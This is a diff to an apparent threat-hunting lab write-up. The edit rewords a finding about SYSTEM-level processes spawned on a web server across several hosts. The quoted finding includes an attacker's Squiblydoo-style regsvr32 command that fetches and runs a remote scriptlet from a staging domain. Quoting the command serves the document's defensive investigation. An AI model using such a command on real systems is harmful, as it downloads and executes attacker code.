@@ -119,7 +119,7 @@ winlog.event_id: 1 AND user.name: SYSTEM AND NOT winlog.event_data.ParentUser:
 
 ![SYSTEM-parented processes across WKSTN-1, INTSRV01, and DC01](../images/Threat-Hunting_Pivoting/9.png)
 
-6 hits. The smss.exe entries on WKSTN-1 and the TiWorker.exe entries on DC01 are normal OS boot and servicing activity. The two INTSRV01 entries are not: `IIS APPPOOL\DefaultAppPool` spawned `spoofer.exe` via `regsvr32 /s /n /u /i:http://www.oneedirve.xyz/321c3cf/teams.sct scrobj.dll`, ending in a SYSTEM process. That's the same staging domain from Discovery, now delivering a Squiblydoo-style scriptlet execution against a web server.
+6 hits. The smss.exe entries on WKSTN-1 and the TiWorker.exe entries on DC01 are normal OS boot and servicing activity. The INTSRV01 entry is not: `IIS APPPOOL\DefaultAppPool` spawned `spoofer.exe` via `regsvr32 /s /n /u /i:http://www.oneedirve.xyz/321c3cf/teams.sct scrobj.dll`, ending in a SYSTEM process. That's the same staging domain from Discovery, now delivering a Squiblydoo-style scriptlet execution against a web server.
 
 ![spoofer.exe process detail with the encoded PowerShell parent command line](../images/Threat-Hunting_Pivoting/10.png)
 
